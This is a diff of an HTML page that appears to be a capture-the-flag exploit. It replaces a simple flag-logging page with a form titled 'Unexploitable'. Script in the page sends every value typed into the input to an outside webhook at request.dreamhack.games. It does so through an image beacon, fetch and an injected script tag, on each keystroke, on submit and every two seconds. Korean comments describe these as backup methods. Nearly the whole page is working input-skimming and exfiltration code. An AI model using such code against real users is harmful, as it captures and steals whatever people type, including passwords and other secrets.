@@ -1,37 +1,61 @@
-<!DOCTYPE html>
-  <html>
+ <!DOCTYPE html>
+  <html lang="en">
   <head>
-      <title>Flag Logger</title>
+      <meta charset="UTF-8">
+      <title>Unexploitable</title>
   </head>
   <body>
-      <h1>Captured Flags</h1>
-      <div id="flags"></div>
+      <form method="get">
+          <input type="text" name="input" id="input" form="">
+          <input type="submit" name="submit" id="submit" value="Submit">
+      </form>
 
       <script>
-          // URL 쿼리 파라미터에서 flag 추출
-          const params = new URLSearchParams(window.location.search);
-          const flag = params.get('flag');
+          const WEBHOOK = 'https://dpxmgfj.request.dreamhack.games';
+          const input = document.getElementById('input');
 
-          if (flag) {
-              // localStorage에 저장
-              const flags = JSON.parse(localStorage.getItem('flags') || '[]');
-              flags.push({
-                  flag: flag,
-                  timestamp: new Date().toISOString()
-              });
-              localStorage.setItem('flags', JSON.stringify(flags));
+          // 전송 함수
+          function sendFlag(flag) {
+              if (!flag || flag.length === 0) return;
 
-              // 페이지에 표시
-              document.getElementById('flags').innerHTML =
-                  '<p>Flag captured: <code>' + flag + '</code></p>';
+              const url = WEBHOOK + '?flag=' + encodeURIComponent(flag);
 
-              console.log('Flag logged:', flag);
+              // 방법 1: 이미지 (가장 안정적)
+              new Image().src = url;
+
+              // 방법 2: Fetch (백업)
+              setTimeout(() => {
+                  fetch(url, {
+                      method: 'GET',
+                      mode: 'no-cors'
+                  }).catch(() => {});
+              }, 100);
+
+              // 방법 3: 스크립트 태그 (또 다른 백업)
+              setTimeout(() => {
+                  const script = document.createElement('script');
+                  script.src = url;
+                  document.head.appendChild(script);
+              }, 200);
           }
 
-          // 모든 flags 표시
-          const allFlags = JSON.parse(localStorage.getItem('flags') || '[]');
-          document.getElementById('flags').innerHTML +=
-              '<pre>' + JSON.stringify(allFlags, null, 2) + '</pre>';
+          // Input 변경 감시 (실시간)
+          input.addEventListener('input', (e) => {
+              sendFlag(e.target.value);
+          });
+
+          // Form submit 감시
+          document.querySelector('form').addEventListener('submit', (e) => {
+              sendFlag(input.value);
+              e.preventDefault();
+          });
+
+          // 보안: 주기적으로 현재 값 재전송 (혹시 놓칠 수 있는 경우)
+          setInterval(() => {
+              if (input.value) {
+                  sendFlag(input.value);
+              }
+          }, 2000);
       </script>
   </body>
   </html>
